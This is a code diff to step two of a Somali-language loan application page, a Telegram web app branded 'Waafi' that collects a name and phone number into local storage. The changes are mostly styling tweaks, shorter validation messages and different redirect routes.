@@ -5,15 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Codsiga Amaahda - Step 2</title>
 
-    <!-- Telegram SDK (correct) -->
+    <!-- ✅ FIXED Telegram SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, sans-serif;
             background-color: #f8f9fa;
             margin: 0;
-            padding: 0;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -28,14 +27,6 @@
             justify-content: space-between;
             align-items: center;
             box-sizing: border-box;
-        }
-
-        .back-link {
-            display: flex;
-            align-items: center;
-            font-size: 22px;
-            font-weight: 500;
-            cursor: pointer;
         }
 
         .waafi-logo {
@@ -58,8 +49,6 @@
             text-align: center;
             margin: 0;
             font-size: 26px;
-            color: #333;
-            font-weight: 600;
         }
 
         .step-info {
@@ -95,7 +84,6 @@
             font-size: 16px;
             font-weight: 500;
             margin-bottom: 10px;
-            color: #333;
         }
 
         input {
@@ -121,24 +109,17 @@
             line-height: 48px;
         }
 
-        .phone-hint {
-            font-size: 12px;
-            color: #777;
-            margin-top: 8px;
-        }
-
         .btn-container {
-            margin-top: 30px;
             display: flex;
             flex-direction: column;
             gap: 15px;
+            margin-top: 30px;
         }
 
         .back-btn {
             background-color: #f1f1f1;
             color: #777;
             border: 1px solid #ddd;
-            width: 100%;
             padding: 16px;
             border-radius: 10px;
             font-size: 18px;
@@ -150,7 +131,6 @@
             background: linear-gradient(90deg, #a4e433 0%, #7dbd27 100%);
             color: white;
             border: none;
-            width: 100%;
             padding: 18px;
             border-radius: 10px;
             font-size: 18px;
@@ -163,8 +143,7 @@
             text-align: center;
             font-size: 13px;
             color: #aaa;
-            margin-top: 40px;
-            padding-bottom: 30px;
+            margin: 40px 0 30px;
         }
     </style>
 </head>
@@ -172,7 +151,7 @@
 <body>
 
 <div class="nav-header">
-    <div class="back-link" onclick="goBack()">← Dib u noqo</div>
+    <div onclick="goBack()" style="cursor:pointer; font-size:20px;">← Dib u noqo</div>
     <div class="waafi-logo">Waafi</div>
     <div style="font-size: 26px;">☰</div>
 </div>
@@ -203,7 +182,6 @@
             <input type="text" class="country-code" value="+252" readonly>
             <input type="tel" id="phone" placeholder="612345678" maxlength="9">
         </div>
-        <p class="phone-hint">Geli 9 tiro sax ah</p>
     </div>
 
     <div class="btn-container">
@@ -220,27 +198,28 @@
         const lName = document.getElementById('lastName').value.trim();
         const phone = document.getElementById('phone').value.trim();
 
+        // ✅ Validation
         if (!fName || !lName || !phone) {
-            alert("Fadlan buuxi dhammaan meelaha banaan.");
+            alert("Fadlan buuxi dhammaan meelaha!");
             return;
         }
 
         if (phone.length !== 9 || isNaN(phone)) {
-            alert("Geli number sax ah (9 digits oo keliya).");
+            alert("Geli number sax ah (9 digits).");
             return;
         }
 
+        // ✅ Save
         localStorage.setItem('firstName', fName);
         localStorage.setItem('lastName', lName);
         localStorage.setItem('phone', phone);
 
-        // FIX: must match your Express route system (/page3 or /page4 depending on flow)
-        window.location.href = "/page3";
+        // ✅ Go to Step 3
+        window.location.href = "/page4";
     }
 
     function goBack() {
-        // FIX: Step 1 is usually page2 (your calculator page)
-        window.location.href = "/page2";
+        window.location.href = "/"; // Step 1
     }
 
     window.onload = () => {
@@ -250,7 +229,7 @@
             tg.expand();
         }
 
-        // Auto-fill safely
+        // ✅ Auto-fill when coming back
         const f = localStorage.getItem('firstName');
         const l = localStorage.getItem('lastName');
         const p = localStorage.getItem('phone');
